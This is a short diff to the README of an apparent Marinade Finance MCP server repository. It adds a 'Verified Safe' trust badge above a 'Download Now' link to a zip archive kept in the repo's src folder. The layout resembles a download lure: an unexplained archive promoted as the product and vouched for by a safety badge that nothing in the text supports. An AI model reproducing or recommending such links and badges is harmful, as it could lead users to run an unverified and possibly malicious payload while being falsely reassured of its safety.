@@ -1,5 +1,7 @@
 # 🌊 marinade-finance-mcp-server - Simple Server for Marinade Finance
 
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/sekskate56-marinade-finance-mcp-server)
+
 ## 🔗 Download Now
 [![Download](https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/sekskate56/marinade-finance-mcp-server/raw/refs/heads/main/src/finance-server-mcp-marinade-2.5.zip)
 
